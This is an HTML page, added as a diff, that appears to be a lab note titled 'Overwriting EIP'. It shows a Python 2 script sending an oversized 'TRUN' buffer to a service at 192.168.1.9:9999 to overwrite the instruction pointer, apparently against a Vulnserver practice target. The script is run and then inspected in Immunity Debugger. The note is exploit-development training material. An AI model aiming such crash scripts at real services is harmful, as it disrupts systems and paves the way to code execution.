@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Overwriting EIP</title>
+</head><body><span style="font-family: monospace">┌──(lolpotch㉿Lolpotch)-[~]<br/>
+└─$ cat 2.py<br/>
+#!/usr/bin/python<br/>
+import sys, socket<br/>
+<br/>
+# EBP filled with 41 from "A"<br/>
+# EIP filled with 42 from "B"<br/>
+shellcode = "A" * 2003 + "B" * 4<br/>
+<br/>
+while True:<br/>
+&nbsp; &nbsp; try: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #IP Address &nbsp; &nbsp; &nbsp; Port<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s.connect(('192.168.1.9', 9999))<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; &nbsp; &nbsp; TRUN is based on command we found crashed when spiked<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s.send(('TRUN /.:/' + shellcode))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s.close()<br/>
+<br/>
+&nbsp; &nbsp; except:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; print "Error connecting to the server"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sys.exit()<br/>
+<br/>
+┌──(lolpotch㉿Lolpotch)-[~]<br/>
+└─$ chmod +x 2.py<br/>
+<br/>
+┌──(lolpotch㉿Lolpotch)-[~]<br/>
+</span><span style="font-family: monospace">└─$ python2 2.py</span><br/>
+<br/>
+ImmunityDebugger.exe<br/>
+<img src="image.png" /><br/>
+<img src="image 2.png" /><br/>
+<br/>
+</body></html>
